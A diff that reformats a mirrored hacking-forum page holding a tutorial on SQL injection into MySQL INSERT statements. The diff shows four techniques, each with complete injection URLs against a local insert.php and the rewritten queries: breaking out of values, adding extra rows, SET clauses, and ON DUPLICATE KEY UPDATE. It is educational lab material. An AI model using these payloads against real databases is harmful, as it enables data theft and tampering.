@@ -1,28 +1,25 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">
+<html dir="ltr" id="vbulletin_html" lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml"><!-- Mirrored from garage4hackers.com/printthread.php?t=6208&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:33:55 GMT --><!-- Added by HTTrack --><head><meta content="text/html;charset=utf-8" http-equiv="content-type"/><!-- /Added by HTTrack -->
 
-<!-- Mirrored from garage4hackers.com/printthread.php?t=6208&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:33:55 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
-<head>
-	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
-	<base  /><!--[if IE]></base><![endif]-->
-	<meta name="generator" content="vBulletin 4.2.1" />
+	<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+	<base/><!--[if IE]></base><![endif]-->
+	<meta content="vBulletin 4.2.1" name="generator"/>
 
 	
-	<link rel="stylesheet" type="text/css" href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" />
+	<link href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" rel="stylesheet" type="text/css"/>
 	
 
 
 
 	<title> INSERT Statement Sql Injection - Advanced - Tutorial</title>
-	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+	<link href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" rel="stylesheet" type="text/css"/>
 
 </head>
 <body>
 
 <div class="above_body">
-<div id="header" class="floatcontainer">
-<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+<div class="floatcontainer" id="header">
+<div><a class="logo-image" href="forum.html" name="top"><img alt="Garage4hackers Forum" src="images/misc/vbulletin4_logo.png"/></a></div>
 </div>
 </div>
 <div class="body_wrapper">
@@ -44,107 +41,107 @@
 		<div class="title">INSERT Statement Sql Injection - Advanced - Tutorial</div>
 	
 	<div class="content">
-		<blockquote class="restore">Hello everyone,<br />
-<br />
-My friend, Cyde, and I have been looking at a public source it's been few days and we found a lot of vulnerabilities related to Sql Injection where most of the statements where INSERT Statements and not the usual SELECT. Now I know that most people think that these kinds of injections are difficult and hard to deal with and that's why in this Tutorial I'll be explaining how to Inject various INSERT Statements which will be holding few tips and tricks.<br />
-<br />
-<font color="#FF4500"><font size="3">Our Goal</font></font><br />
-Before we keep talking about this, I think you must know that the goal of these injections here are based on injecting a SELECT Statement within the INSERT Statement which will then force the Database to Insert the results of our SELECT statement and, as you'll see later, these inserted values will show up on a webpage which means that whatever we were after will be there for us to look at Lol.<br />
-All of this tutorial is obviously easier if you know the original INSERT Statement because it's required for proper manipulating.<br />
-<br />
-<font color="#FF4500"><font size="3">The information</font></font><br />
-<ol class="decimal"><li style="">Database/Table</li></ol><br />
-<a href="../dotcppfile.files.wordpress.com/2015/02/screenshot-from-2015-02-24-171256.png" target="_blank">https://dotcppfile.files.wordpress.c...-24-171256.png</a><br />
-What matters the most in this Table is that the column 'id' is Unique and Auto Increments which means that each comment has its own ID and no other comment can have the same one, also, you don't have to provide an id value when inserting data in this table because the id column will be automatically filled; the first comment will have id=1, the second comment will have id=2, etc, but keep in mind that you can give an id to a comment if you want to. Everything I just mentioned is really important and you'll see why soon.<br />
-<ol class="decimal"><li style="">Insert Script: 127.0.0.1/insert.php</li></ol><br />
-It supports two get variables only, 'videoid' and 'comment'. The username is automatically set to 'dotcppfile' and the 'id', just like we said before, gets an automatic value. So all we need is something like this request: 127.0.0.1/insert.php?videoid=123456&amp;amp;comment=interesting to insert a proper comment.<br />
-<ol class="decimal"><li style="">The comments that we insert shows up at: 127.0.0.1/comments.php</li></ol><br />
-<a href="../dotcppfile.files.wordpress.com/2015/02/screenshot-from-2015-02-24-172211.png" target="_blank">https://dotcppfile.files.wordpress.c...-24-172211.png</a><br />
-<ol class="decimal"><li style="">Our Insert page's source: pastebin.com/58w0h2Nw</li></ol><br />
-<font color="#FF4500"><font size="3">Various Interesting Types of INSERT Statements</font></font><br />
-<ol class="decimal"><li style=""><i>Type 1:</i> INSERT INTO comments ('comment' ,'username', 'videoid') VALUES ('interesting', 'dotcppfile', '123456')<br /></li><li style=""><i>Type 2:</i> INSERT INTO comments SET comment = 'interesting', username = 'dotcppfile', 'videoid' = '123456'</li></ol><br />
-There's INSERT SELECT, INSERT DELAYED and many others but these can be injected in the same way so it's not that interesting. Anyways, we will be exploiting both of these types in 2 ways based on which variable is vulnerable.<br />
-<br />
-<font color="#FF4500"><font size="3">Type 1 - First</font></font><br />
-So, we have the following insert statement:<br />
-INSERT INTO comments ('comment' ,'username', 'videoid') VALUES ('interesting', 'dotcppfile', '123456').<br />
-In this case, the get variable 'comment' in 'insert.php' is vulnerable. If we want to inject a proper select statement into this we should go for:<br />
-127.0.0.1/insert.php?videoid=123456&amp;amp;comment=interesting ', (select version()), '123456')--+<br />
-Our Original INSERT Statement will become:<br />
-INSERT INTO comments ('comment' ,'username', 'videoid') VALUES ('interesting', (select version()), '123456')--+', 'dotcppfile', '123456')<br />
-Now everything after --+ will be commented and what gets inserted in the database is what we asked for which is a comment that holds &quot;interesting&quot; and is posted by 'select version()' and that will be the output on 'comments.php':<br />
-<a href="../dotcppfile.files.wordpress.com/2015/02/screenshot-from-2015-02-24-175308.png" target="_blank">https://dotcppfile.files.wordpress.c...-24-175308.png</a><br />
-As you can see, the username is the value of our inserted SELECT statement, as simple as that.<br />
-<br />
-Now this part here is something you've seen out there, but what comes next should be original so keep reading.<br />
-<br />
-<font color="#FF4500"><font size="3">Type 1 - Second</font></font><br />
-We have the same INSERT Statement:<br />
-INSERT INTO comments ('comment' ,'username', 'videoid') VALUES ('interesting', 'dotcppfile', '123456')<br />
-But this time, the get variable 'videoid' is vulnerable in 'insert.php'.<br />
-Now, in this case, we have a huge difference, what I'm trying to say is what we used in the last part won't work, because we cannot edit the username or the comment or the videoid since they come before our injection. But, fortunately, in an INSERT Statement, you can insert multiple rows at a time using something like this:<br />
-INSERT into comments ('comment', 'username', 'videoid') VALUES ('first comment', 'dotcppfile', '123456'), ('second comment', 'dotcppfile', '123456')<br />
-We are going to use this right now to get things working, so here's how our link will look like:<br />
-127.0.0.1/insert.php?comment=interesting&amp;amp;videoid=123456 '), ('second comment', (select version()), '123456')--+<br />
-Our INSERT Statement will become:<br />
-INSERT into comments ('comment', 'username', 'videoid') VALUES ('first comment', 'dotcppfile', '123456'), ('second comment', (select version()), '123456')--+')<br />
-And the output on 'comments.php' will be:<br />
-<a href="../dotcppfile.files.wordpress.com/2015/02/screenshot-from-2015-02-24-180552.png" target="_blank">https://dotcppfile.files.wordpress.c...-24-180552.png</a><br />
-So two comments were inserted and the second one was holding the result of our SELECT Statement.<br />
-<br />
-As you can see, we can always do something no matter what, now lets move to Type 2.<br />
-<br />
-<font color="#FF4500"><font size="3">Type 2 - First</font></font><br />
-Our INSERT Statement is the following: INSERT INTO comments SET comment = 'interesting', username = 'dotcppfile', 'videoid' = '123456'<br />
-In 'insert.php' the get variable 'comment' is vulnerable, so to inject this properly we will be in need of the following URL:<br />
-127.0.0.1/insert.php?videoid=123456&amp;amp;comment=interesting ', username=(select version()), videoid='123456'--+<br />
-The INSERT Statement will become:<br />
-INSERT INTO comments SET comment = 'interesting', username=(select version()), videoid='123456'--+', username = 'dotcppfile', 'videoid' = '123456'<br />
-<br />
-And that's pretty much it.<br />
-<br />
-<font color="#FF4500"><font size="3">Type 2 - Second</font></font><br />
-Now this is what matters the most in this Tutorial.<br />
-In this part we will be using an INSERT Statement with an UPDATE Statement to get things up and running properly.<br />
-So again, our INSERT Statement is:<br />
-INSERT INTO comments SET comment = 'interesting', username = 'dotcppfile', 'videoid' = '123456'<br />
-But this time, in 'insert.php', the vulnerable get variable is 'videoid' and it won't be easy  if we want to Sql Iinject and that is because 'videoid' is at the end of our INSERT Statement and we can't do just like we did in 'Type 1 - Second' in this type because it doesn't work that way, but again, there's always a way:<br />
-If you remember, first, I mentioned that the table holds a column called 'id' that is Unique and Auto Increments, so every comment has its own id which is something we can use in our favor here. Now what we know is that the INSERT Statement doesn't fill the 'id' column, since it gets filled automatically, but we can fill it up and you'll see we want to soon, so, lets create a normal comment and give it our own id.<br />
-<i>Warning</i>: We have to make sure that the 'id' we're giving is unique or else we will get a 'mysql error'.<br />
-<br />
-Lets go for the following URL:<br />
-127.0.0.1/insert.php?comment=interesting&amp;amp;videoid=123456 ', id=2147483640--+<br />
-The INSERT Statement will become:<br />
-INSERT INTO comments SET comment = 'interesting', username = 'dotcppfile', 'videoid' = '123456', id=2147483640--+'<br />
-And if we check the 'comments.php' page:<br />
-<a href="../dotcppfile.files.wordpress.com/2015/02/screenshot-from-2015-02-24-183140.png" target="_blank">https://dotcppfile.files.wordpress.c...-24-183140.png</a><br />
-Normal right? Obviously, but if we take a look at Data in the Table:<br />
-<a href="../dotcppfile.files.wordpress.com/2015/02/screenshot-from-2015-02-24-183222.png" target="_blank">https://dotcppfile.files.wordpress.c...-24-183222.png</a><br />
-As you can see, our own 'id' was inserted, but, what's the point?<br />
-What we are trying to do here it to use the INSERT ... ON DUPLICATE KEY UPDATE statement: dev.mysql.com/doc/refman/5.0/en/insert-on-duplicate.html<br />
-What this statement will do is update the data in the Table with new data that was appended with the new insert statement IF the new data has the same ID as the main one. Read this again, it's what this whole part is about.<br />
-<i>Example:</i><br />
-If we have the following Data in the Table:<br />
-2147483640 | 123456 | dotcppfile | interesting<br />
-And we try to insert the following using the INSERT ... ON DUPLICATE KEY UPDATE statement with 'comment':<br />
-2147483640 | 123456 | dotcppfile | second comment<br />
-It won't be inserted, but the main data will be updated and it will become:<br />
-2147483640 | 123456 | dotcppfile | second comment<br />
-<br />
-Now we are going to use this, and our URL will be:<br />
-127.0.0.1/insert.php?comment=interesting&amp;amp;videoid=123456 ', id=2147483640 ON DUPLICATE KEY UPDATE comment=(select version())--+<br />
-And our INSERT Statement will be:<br />
-INSERT INTO comments SET comment = 'interesting', username = 'dotcppfile', 'videoid' = '123456', id=2147483640 ON DUPLICATE KEY UPDATE comment=(select version())--+<br />
-And the new output on our 'comments.php' will be:<br />
-<a href="../dotcppfile.files.wordpress.com/2015/02/screenshot-from-2015-02-24-184118.png" target="_blank">https://dotcppfile.files.wordpress.c...-24-184118.png</a><br />
-So we updated the old comment with the new comment.<br />
-<br />
-As simple as that.<br />
-<br />
-Now as you can see, INSERT Statements can be manipulated, we just have to be smart about it and do it right, we handled them in 4 ways in this tutorial and as far as I know this is mostly everything out there.<br />
-<br />
-I hope you learned something new,<br />
-that's all for today,<br />
+		<blockquote class="restore">Hello everyone,<br/>
+<br/>
+My friend, Cyde, and I have been looking at a public source it's been few days and we found a lot of vulnerabilities related to Sql Injection where most of the statements where INSERT Statements and not the usual SELECT. Now I know that most people think that these kinds of injections are difficult and hard to deal with and that's why in this Tutorial I'll be explaining how to Inject various INSERT Statements which will be holding few tips and tricks.<br/>
+<br/>
+<font color="#FF4500"><font size="3">Our Goal</font></font><br/>
+Before we keep talking about this, I think you must know that the goal of these injections here are based on injecting a SELECT Statement within the INSERT Statement which will then force the Database to Insert the results of our SELECT statement and, as you'll see later, these inserted values will show up on a webpage which means that whatever we were after will be there for us to look at Lol.<br/>
+All of this tutorial is obviously easier if you know the original INSERT Statement because it's required for proper manipulating.<br/>
+<br/>
+<font color="#FF4500"><font size="3">The information</font></font><br/>
+<ol class="decimal"><li style="">Database/Table</li></ol><br/>
+<a href="../dotcppfile.files.wordpress.com/2015/02/screenshot-from-2015-02-24-171256.png" target="_blank">https://dotcppfile.files.wordpress.c...-24-171256.png</a><br/>
+What matters the most in this Table is that the column 'id' is Unique and Auto Increments which means that each comment has its own ID and no other comment can have the same one, also, you don't have to provide an id value when inserting data in this table because the id column will be automatically filled; the first comment will have id=1, the second comment will have id=2, etc, but keep in mind that you can give an id to a comment if you want to. Everything I just mentioned is really important and you'll see why soon.<br/>
+<ol class="decimal"><li style="">Insert Script: 127.0.0.1/insert.php</li></ol><br/>
+It supports two get variables only, 'videoid' and 'comment'. The username is automatically set to 'dotcppfile' and the 'id', just like we said before, gets an automatic value. So all we need is something like this request: 127.0.0.1/insert.php?videoid=123456&amp;amp;comment=interesting to insert a proper comment.<br/>
+<ol class="decimal"><li style="">The comments that we insert shows up at: 127.0.0.1/comments.php</li></ol><br/>
+<a href="../dotcppfile.files.wordpress.com/2015/02/screenshot-from-2015-02-24-172211.png" target="_blank">https://dotcppfile.files.wordpress.c...-24-172211.png</a><br/>
+<ol class="decimal"><li style="">Our Insert page's source: pastebin.com/58w0h2Nw</li></ol><br/>
+<font color="#FF4500"><font size="3">Various Interesting Types of INSERT Statements</font></font><br/>
+<ol class="decimal"><li style=""><i>Type 1:</i> INSERT INTO comments ('comment' ,'username', 'videoid') VALUES ('interesting', 'dotcppfile', '123456')<br/></li><li style=""><i>Type 2:</i> INSERT INTO comments SET comment = 'interesting', username = 'dotcppfile', 'videoid' = '123456'</li></ol><br/>
+There's INSERT SELECT, INSERT DELAYED and many others but these can be injected in the same way so it's not that interesting. Anyways, we will be exploiting both of these types in 2 ways based on which variable is vulnerable.<br/>
+<br/>
+<font color="#FF4500"><font size="3">Type 1 - First</font></font><br/>
+So, we have the following insert statement:<br/>
+INSERT INTO comments ('comment' ,'username', 'videoid') VALUES ('interesting', 'dotcppfile', '123456').<br/>
+In this case, the get variable 'comment' in 'insert.php' is vulnerable. If we want to inject a proper select statement into this we should go for:<br/>
+127.0.0.1/insert.php?videoid=123456&amp;amp;comment=interesting ', (select version()), '123456')--+<br/>
+Our Original INSERT Statement will become:<br/>
+INSERT INTO comments ('comment' ,'username', 'videoid') VALUES ('interesting', (select version()), '123456')--+', 'dotcppfile', '123456')<br/>
+Now everything after --+ will be commented and what gets inserted in the database is what we asked for which is a comment that holds "interesting" and is posted by 'select version()' and that will be the output on 'comments.php':<br/>
+<a href="../dotcppfile.files.wordpress.com/2015/02/screenshot-from-2015-02-24-175308.png" target="_blank">https://dotcppfile.files.wordpress.c...-24-175308.png</a><br/>
+As you can see, the username is the value of our inserted SELECT statement, as simple as that.<br/>
+<br/>
+Now this part here is something you've seen out there, but what comes next should be original so keep reading.<br/>
+<br/>
+<font color="#FF4500"><font size="3">Type 1 - Second</font></font><br/>
+We have the same INSERT Statement:<br/>
+INSERT INTO comments ('comment' ,'username', 'videoid') VALUES ('interesting', 'dotcppfile', '123456')<br/>
+But this time, the get variable 'videoid' is vulnerable in 'insert.php'.<br/>
+Now, in this case, we have a huge difference, what I'm trying to say is what we used in the last part won't work, because we cannot edit the username or the comment or the videoid since they come before our injection. But, fortunately, in an INSERT Statement, you can insert multiple rows at a time using something like this:<br/>
+INSERT into comments ('comment', 'username', 'videoid') VALUES ('first comment', 'dotcppfile', '123456'), ('second comment', 'dotcppfile', '123456')<br/>
+We are going to use this right now to get things working, so here's how our link will look like:<br/>
+127.0.0.1/insert.php?comment=interesting&amp;amp;videoid=123456 '), ('second comment', (select version()), '123456')--+<br/>
+Our INSERT Statement will become:<br/>
+INSERT into comments ('comment', 'username', 'videoid') VALUES ('first comment', 'dotcppfile', '123456'), ('second comment', (select version()), '123456')--+')<br/>
+And the output on 'comments.php' will be:<br/>
+<a href="../dotcppfile.files.wordpress.com/2015/02/screenshot-from-2015-02-24-180552.png" target="_blank">https://dotcppfile.files.wordpress.c...-24-180552.png</a><br/>
+So two comments were inserted and the second one was holding the result of our SELECT Statement.<br/>
+<br/>
+As you can see, we can always do something no matter what, now lets move to Type 2.<br/>
+<br/>
+<font color="#FF4500"><font size="3">Type 2 - First</font></font><br/>
+Our INSERT Statement is the following: INSERT INTO comments SET comment = 'interesting', username = 'dotcppfile', 'videoid' = '123456'<br/>
+In 'insert.php' the get variable 'comment' is vulnerable, so to inject this properly we will be in need of the following URL:<br/>
+127.0.0.1/insert.php?videoid=123456&amp;amp;comment=interesting ', username=(select version()), videoid='123456'--+<br/>
+The INSERT Statement will become:<br/>
+INSERT INTO comments SET comment = 'interesting', username=(select version()), videoid='123456'--+', username = 'dotcppfile', 'videoid' = '123456'<br/>
+<br/>
+And that's pretty much it.<br/>
+<br/>
+<font color="#FF4500"><font size="3">Type 2 - Second</font></font><br/>
+Now this is what matters the most in this Tutorial.<br/>
+In this part we will be using an INSERT Statement with an UPDATE Statement to get things up and running properly.<br/>
+So again, our INSERT Statement is:<br/>
+INSERT INTO comments SET comment = 'interesting', username = 'dotcppfile', 'videoid' = '123456'<br/>
+But this time, in 'insert.php', the vulnerable get variable is 'videoid' and it won't be easy  if we want to Sql Iinject and that is because 'videoid' is at the end of our INSERT Statement and we can't do just like we did in 'Type 1 - Second' in this type because it doesn't work that way, but again, there's always a way:<br/>
+If you remember, first, I mentioned that the table holds a column called 'id' that is Unique and Auto Increments, so every comment has its own id which is something we can use in our favor here. Now what we know is that the INSERT Statement doesn't fill the 'id' column, since it gets filled automatically, but we can fill it up and you'll see we want to soon, so, lets create a normal comment and give it our own id.<br/>
+<i>Warning</i>: We have to make sure that the 'id' we're giving is unique or else we will get a 'mysql error'.<br/>
+<br/>
+Lets go for the following URL:<br/>
+127.0.0.1/insert.php?comment=interesting&amp;amp;videoid=123456 ', id=2147483640--+<br/>
+The INSERT Statement will become:<br/>
+INSERT INTO comments SET comment = 'interesting', username = 'dotcppfile', 'videoid' = '123456', id=2147483640--+'<br/>
+And if we check the 'comments.php' page:<br/>
+<a href="../dotcppfile.files.wordpress.com/2015/02/screenshot-from-2015-02-24-183140.png" target="_blank">https://dotcppfile.files.wordpress.c...-24-183140.png</a><br/>
+Normal right? Obviously, but if we take a look at Data in the Table:<br/>
+<a href="../dotcppfile.files.wordpress.com/2015/02/screenshot-from-2015-02-24-183222.png" target="_blank">https://dotcppfile.files.wordpress.c...-24-183222.png</a><br/>
+As you can see, our own 'id' was inserted, but, what's the point?<br/>
+What we are trying to do here it to use the INSERT ... ON DUPLICATE KEY UPDATE statement: dev.mysql.com/doc/refman/5.0/en/insert-on-duplicate.html<br/>
+What this statement will do is update the data in the Table with new data that was appended with the new insert statement IF the new data has the same ID as the main one. Read this again, it's what this whole part is about.<br/>
+<i>Example:</i><br/>
+If we have the following Data in the Table:<br/>
+2147483640 | 123456 | dotcppfile | interesting<br/>
+And we try to insert the following using the INSERT ... ON DUPLICATE KEY UPDATE statement with 'comment':<br/>
+2147483640 | 123456 | dotcppfile | second comment<br/>
+It won't be inserted, but the main data will be updated and it will become:<br/>
+2147483640 | 123456 | dotcppfile | second comment<br/>
+<br/>
+Now we are going to use this, and our URL will be:<br/>
+127.0.0.1/insert.php?comment=interesting&amp;amp;videoid=123456 ', id=2147483640 ON DUPLICATE KEY UPDATE comment=(select version())--+<br/>
+And our INSERT Statement will be:<br/>
+INSERT INTO comments SET comment = 'interesting', username = 'dotcppfile', 'videoid' = '123456', id=2147483640 ON DUPLICATE KEY UPDATE comment=(select version())--+<br/>
+And the new output on our 'comments.php' will be:<br/>
+<a href="../dotcppfile.files.wordpress.com/2015/02/screenshot-from-2015-02-24-184118.png" target="_blank">https://dotcppfile.files.wordpress.c...-24-184118.png</a><br/>
+So we updated the old comment with the new comment.<br/>
+<br/>
+As simple as that.<br/>
+<br/>
+Now as you can see, INSERT Statements can be manipulated, we just have to be smart about it and do it right, we handled them in 4 ways in this tutorial and as far as I know this is mostly everything out there.<br/>
+<br/>
+I hope you learned something new,<br/>
+that's all for today,<br/>
 dotcppfile.</blockquote>
 	</div>
 </li><li class="postbit blockbody" id="post_2">
@@ -168,15 +165,15 @@ dotcppfile.</blockquote>
 		<blockquote class="restore"><div class="bbcode_container">
 	<div class="bbcode_description">Quote:</div>
 	<div class="bbcode_quote printable">
-		<hr />
+		<hr/>
 		
 			<div>
 				Originally Posted by <strong>nullbyte</strong>
-				<a href="showthread0858.html?p=13807#post13807" rel="nofollow"><img class="inlineimg" src="images/buttons/viewpost.html" alt="View Post" /></a>
+				<a href="showthread0858.html?p=13807#post13807" rel="nofollow"><img alt="View Post" class="inlineimg" src="images/buttons/viewpost.gif"/></a>
 			</div>
 			<div class="message">thanks for sharing your article with insert sql statements :-)</div>
 			
-		<hr />
+		<hr/>
 	</div>
 </div>Great you liked it, thanks for posting.</blockquote>
 	</div>
@@ -186,14 +183,14 @@ dotcppfile.</blockquote>
 
 </div>
 <div class="below_body">
-<div id="footer_time" class="footer_time">All times are GMT +5.5. The time now is <span class="time">05:08 PM</span>.</div>
+<div class="footer_time" id="footer_time">All times are GMT +5.5. The time now is <span class="time">05:08 PM</span>.</div>
 
-<div id="footer_copyright" class="footer_copyright">
+<div class="footer_copyright" id="footer_copyright">
 	<!-- Do not remove this copyright notice -->
-	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin®</a> Version 4.2.1 <br/>Copyright © 2020 vBulletin Solutions, Inc. All rights reserved. 
 	<!-- Do not remove this copyright notice -->	
 </div>
-<div id="footer_morecopyright" class="footer_morecopyright">
+<div class="footer_morecopyright" id="footer_morecopyright">
 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
 	
 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
@@ -211,7 +208,7 @@ try{
 var pageTracker = _gat._getTracker('UA-17311051-3');
 pageTracker._trackPageview();
 } catch(err) {}</script>
-</body>
 
-<!-- Mirrored from garage4hackers.com/printthread.php?t=6208&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:33:55 GMT -->
-</html>
+
+
+</body><!-- Mirrored from garage4hackers.com/printthread.php?t=6208&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:33:55 GMT --></html>
